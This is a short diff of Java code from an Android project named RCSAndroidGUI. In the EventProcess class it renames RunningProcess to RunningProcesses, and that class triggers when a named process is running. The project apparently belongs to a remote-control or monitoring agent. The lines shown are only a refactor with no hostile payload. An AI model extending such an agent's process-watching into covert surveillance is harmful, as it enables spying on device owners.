@@ -9,9 +9,9 @@ import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerProcess;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 import com.ht.RCSAndroidGUI.util.WChar;
-import com.ht.RCSAndroidGUI.RunningProcess;
+import com.ht.RCSAndroidGUI.RunningProcesses;
 
-public class EventProcess extends EventBase implements Observer<RunningProcess> {
+public class EventProcess extends EventBase implements Observer<RunningProcesses> {
 		/** The Constant TAG. */
 		private static final String TAG = "EventProcess";
 
@@ -61,7 +61,7 @@ public class EventProcess extends EventBase implements Observer<RunningProcess> 
 		}
 
 		// Viene richiamata dal listener (dalla dispatch())
-		public int notification(RunningProcess p) {
+		public int notification(RunningProcesses p) {
 			switch (type) {
 				case 0: // Process
 					if (p.isPresent(name) == true && active == false) {
